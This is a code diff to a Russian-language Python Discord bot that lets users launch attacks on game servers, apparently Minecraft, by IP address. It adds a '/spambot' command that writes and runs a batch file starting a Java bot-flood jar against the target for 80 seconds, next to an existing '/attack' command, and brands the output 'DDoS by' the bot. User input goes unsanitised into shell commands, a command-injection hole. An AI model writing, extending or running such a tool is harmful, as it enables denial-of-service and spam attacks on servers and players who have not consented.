@@ -4,6 +4,9 @@ import threading
 import requests
 import asyncio
 import config
+from discord.commands import Option
+import pathlib
+import subprocess
 
 from discord.ext import commands
 
@@ -15,6 +18,20 @@ testingservers = config.GUILDS
 
 def attack_server(ip):
     os.system("java -jar ping.jar {}".format(ip))
+
+def attack_server_spambot(ip, message, path_desktop):
+    ip1, port = ip.split(':', 1)
+    if os.name == "nt":
+        batch = f'@echo off\nstart \"attack\" java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar {path_desktop}\\b.jar\ntimeout /t 80\ntaskkill /im java.exe'
+        batch_f = pathlib.Path('./attack.bat')
+        if batch_f.exists():
+            os.remove('./attack.bat')
+        with open("./attack.bat", "a+") as f:
+            f.write(batch)
+            f.close()
+        subprocess.call([r'attack.bat'])
+    else:
+        os.system(f'timeout 80s java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar {path_desktop}\\b.jar')
 
 @bot.event
 async def on_ready():
@@ -57,22 +74,21 @@ async def credits(ctx):
 @commands.has_permissions(administrator=True)
 async def reload(ctx):
     try:
-        await ctx.respond(f'Бот перезапущен!\n\n Ждёт работаспособности! ')
+        await ctx.respond(f'Бот перезапущен!\n\n Ждёт работоспособности! ')
         os.system(f'python bot.py')
     except:
         await ctx.respond("Бот умер, перезапустите пожалуйта!")
 
 @bot.slash_command(guild_ids = testingservers, name = "clear", description = "Очистить сообщения!")
 @commands.has_permissions(manage_messages=True)
-async def clear(ctx, limit: int):
-        await ctx.channel.purge(limit=limit)
-        embed1 = discord.Embed(title = "Очистка...", description=f"канал был очищен от {limit} сообщения от {ctx.author.mention}",color = discord.Color.from_rgb(255,0,0  ))
+async def clear(ctx, limit: Option(int, "Сколько сообщений удалить")):
+        await ctx.channel.purge(limit=int(limit))
+        embed1 = discord.Embed(title = "Очистка...", description=f"Канал бы очищен от {limit} сообщений. Вызвал команду: {ctx.author.mention}",color = discord.Color.from_rgb(255,0,0  ))
         await ctx.respond(embed=embed1, delete_after=10)
-        await ctx.message.delete()
 
 @bot.slash_command(guild_ids = testingservers, name = "attack", description = "Атака сервера!")
 @commands.cooldown(1, 60, commands.BucketType.user)
-async def attack(ctx, ip):
+async def attack(ctx, ip: Option(str, "Айпи сервера для атаки")):
     def attack_start():
        thread = threading.Thread(target=attack_server, args=(ip,))
        thread.setDaemon(True)
@@ -87,7 +103,7 @@ async def attack(ctx, ip):
         )
         return await ctx.respond(embed=error)
     embed = discord.Embed(
-        title='Начала атаки...',
+        title='Начало атаки...',
         description=f'Атака от {ctx.author.mention}',
         color=discord.Colour.red()
     )
@@ -97,9 +113,37 @@ async def attack(ctx, ip):
     attack_start()
     await ctx.respond(embed=embed)
 
+@bot.slash_command(guild_ids = testingservers, name = "spambot", description = "Атака спам ботами (Могут быть баги)")
+@commands.cooldown(1, 60, commands.BucketType.user)
+async def spambot(ctx, ip: Option(str, "Айпи сервера для атаки"), message: Option(str, "Сообщение которое будут отправлять боты (можно указать команду)")):
+    def attack_start():
+       thread = threading.Thread(target=attack_server_spambot, args=(ip,message,pathlib.Path(__file__).parent.resolve(),))
+       thread.setDaemon(True)
+       thread.start()
+    if ":" in ip:
+        pass
+    else:
+        error = discord.Embed(
+            title="Ошибка",
+            description="Не указан порт сервера",
+            color = discord.Colour.red()
+        )
+        return await ctx.respond(embed=error)
+    embed = discord.Embed(
+        title="Начало атаки спамом...",
+        description=f'Атака от {ctx.author.mention}',
+        color = discord.Colour.red()
+    )
+    embed.add_field(name='Айпи сервера:', value="{}".format(ip), inline=True)
+    embed.add_field(name='Сообщение:', value="{}".format(message), inline=True)
+    embed.set_image(url=config.ATTACK_GIF)
+    embed.set_footer(text="DDoS by " + botname)
+    attack_start()
+    await ctx.respond(embed=embed)
+
 @bot.slash_command(guild_ids = testingservers, name = "resolve", description = "Узнать айпи сервера!")
 @commands.cooldown(1, 60, commands.BucketType.user)
-async def resolve(ctx, server):
+async def resolve(ctx, server: Option(str, "Айпи сервера (например hypixel.net)")):
     url = "https://api.mcsrvstat.us/2/" + server
     resp = requests.get(url)
     data = resp.json()
